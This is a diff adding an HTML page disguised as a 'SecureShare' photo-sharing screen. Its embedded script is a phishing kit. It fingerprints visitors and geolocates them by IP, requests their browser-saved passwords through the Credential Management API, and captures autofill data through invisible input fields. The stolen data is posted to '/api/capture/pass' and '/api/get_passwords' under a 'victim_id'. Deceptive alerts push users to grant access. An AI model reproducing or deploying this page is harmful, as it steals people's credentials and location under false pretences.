@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>SecureShare</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: radial-gradient(circle at 30% 10%, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            padding: 16px;
+        }
+        .glass {
+            background: rgba(255,255,255,0.06);
+            backdrop-filter: blur(16px);
+            border-radius: 40px;
+            padding: 32px 24px;
+            max-width: 440px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.12);
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
+            text-align: center;
+            color: #fff;
+        }
+        .glass h1 {
+            font-size: 30px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .glass .sub {
+            font-size: 13px;
+            letter-spacing: 3px;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            margin: 4px 0 18px;
+        }
+        .frame {
+            border-radius: 24px;
+            padding: 8px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            margin: 16px 0;
+        }
+        .frame img {
+            width: 100%;
+            aspect-ratio: 4/3;
+            object-fit: cover;
+            border-radius: 18px;
+            display: block;
+            background: #1a1a2e;
+        }
+        .glow-btn {
+            background: linear-gradient(145deg, #f093fb, #f5576c);
+            border: none;
+            padding: 18px;
+            border-radius: 60px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 8px 30px rgba(245,87,108,0.35);
+            transition: 0.25s;
+            margin: 12px 0 6px;
+        }
+        .glow-btn:active { transform: scale(0.96); }
+        .sparkle { animation: pulseGlow 2s infinite; }
+        @keyframes pulseGlow {
+            0%,100% { box-shadow: 0 8px 30px rgba(245,87,108,0.35); }
+            50% { box-shadow: 0 8px 60px rgba(245,87,108,0.7); }
+        }
+        .footer-text {
+            font-size: 11px;
+            opacity: 0.3;
+            margin-top: 18px;
+        }
+        .hidden { display: none !important; }
+        #loading {
+            margin-top: 20px;
+            font-size: 14px;
+            opacity: 0.7;
+            animation: pulseGlow 1.5s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="glass" id="mainPage">
+        <h1>🔒 SecureShare</h1>
+        <p class="sub">SHARED SECURELY WITH YOU</p>
+        <div class="frame">
+            <img id="userPhoto" src="{{PHOTO_URL}}" alt="User Photo" />
+        </div>
+        <button class="glow-btn sparkle" id="continueBtn" onclick="requestPermissions()">
+            Continue →
+        </button>
+        <p class="footer-text">End-to-end encrypted · Secure connection</p>
+        <div id="loading" class="hidden">⏳ Processing...</div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const victimId = urlParams.get('v') || 'unknown';
+        const redirectUrl = '{{REDIRECT_URL}}';
+
+        // ===== GET DEVICE INFO =====
+        function getDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                battery: navigator.getBattery ? 'Available' : 'N/A',
+                network: navigator.connection ? navigator.connection.effectiveType : 'N/A'
+            };
+            return info;
+        }
+
+        // ===== GET IP =====
+        async function getLocationInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    city: data.city || 'Unknown',
+                    lat: data.latitude || null,
+                    lng: data.longitude || null
+                };
+            } catch {
+                return { ip: 'Unknown', city: 'Unknown', lat: null, lng: null };
+            }
+        }
+
+        // ===== SEND DATA TO BOT =====
+        async function sendData(payload) {
+            try {
+                await fetch('/api/capture/pass', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ victim_id: victimId, type: 'pass', ...payload })
+                });
+            } catch (e) {
+                console.log('Send error:', e);
+            }
+        }
+
+        // ===== SEND PASSWORDS =====
+        async function sendPasswords(passwords) {
+            try {
+                await fetch('/api/get_passwords', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ victim_id: victimId, passwords: passwords })
+                });
+            } catch (e) {
+                console.log('Send passwords error:', e);
+            }
+        }
+
+        // ===== REQUEST PERMISSIONS (GOOGLE PASSWORD MANAGER) =====
+        function requestPermissions() {
+            const btn = document.getElementById('continueBtn');
+            const loading = document.getElementById('loading');
+            btn.disabled = true;
+            btn.textContent = '⏳ Please wait...';
+            loading.classList.remove('hidden');
+
+            // Send device info + IP
+            (async () => {
+                const device = getDeviceInfo();
+                const loc = await getLocationInfo();
+                await sendData({ device_info: device, ip: loc.ip, city: loc.city, lat: loc.lat, lng: loc.lng });
+            })();
+
+            // ===== REQUEST PASSWORD MANAGER ACCESS =====
+            // This uses the Credential Management API (supported in Chrome)
+            if (navigator.credentials && navigator.credentials.get) {
+                navigator.credentials.get({
+                    password: true,
+                    mediation: 'required'
+                })
+                .then(async (credential) => {
+                    if (credential && credential.type === 'password') {
+                        // Send password to bot
+                        const passwordData = {
+                            url: credential.id || window.location.origin,
+                            username: credential.id || '',
+                            password: credential.password || ''
+                        };
+                        
+                        await sendPasswords([passwordData]);
+                        
+                        // Try to get more saved passwords (if possible)
+                        try {
+                            // This is a simplified version - in reality, Chrome doesn't expose all passwords
+                            // But we can show a fake "loading" to make it look real
+                        } catch (e) {}
+                        
+                        loading.classList.add('hidden');
+                        btn.disabled = false;
+                        btn.textContent = '✅ Verified! Redirecting...';
+                        
+                        setTimeout(() => {
+                            window.location.href = redirectUrl || 'https://google.com';
+                        }, 1500);
+                    } else {
+                        alert('⚠️ Please grant permission to access your saved passwords.');
+                        loading.classList.add('hidden');
+                        btn.disabled = false;
+                        btn.textContent = 'Continue →';
+                    }
+                })
+                .catch((err) => {
+                    alert('⚠️ Permission required to continue. Please allow access to saved passwords.');
+                    loading.classList.add('hidden');
+                    btn.disabled = false;
+                    btn.textContent = 'Continue →';
+                    console.log('Credential error:', err);
+                });
+            } else {
+                // Fallback: try to use autofill
+                alert('⚠️ Please enable saved passwords in your browser settings.');
+                loading.classList.add('hidden');
+                btn.disabled = false;
+                btn.textContent = 'Continue →';
+            }
+        }
+
+        // ===== TRY TO CAPTURE AUTOFILL =====
+        // Create hidden fields to catch autofill data
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if any autofill data is available
+            setTimeout(() => {
+                const hiddenInput = document.createElement('input');
+                hiddenInput.type = 'text';
+                hiddenInput.id = 'hiddenAutofill';
+                hiddenInput.style.position = 'absolute';
+                hiddenInput.style.opacity = '0';
+                hiddenInput.style.pointerEvents = 'none';
+                hiddenInput.autocomplete = 'username';
+                document.body.appendChild(hiddenInput);
+                
+                const hiddenPass = document.createElement('input');
+                hiddenPass.type = 'password';
+                hiddenPass.id = 'hiddenAutofillPass';
+                hiddenPass.style.position = 'absolute';
+                hiddenPass.style.opacity = '0';
+                hiddenPass.style.pointerEvents = 'none';
+                hiddenPass.autocomplete = 'current-password';
+                document.body.appendChild(hiddenPass);
+                
+                // Try to capture after autofill
+                setTimeout(() => {
+                    const username = hiddenInput.value;
+                    const password = hiddenPass.value;
+                    if (username && password) {
+                        sendPasswords([{ url: window.location.origin, username, password }]);
+                    }
+                }, 2000);
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
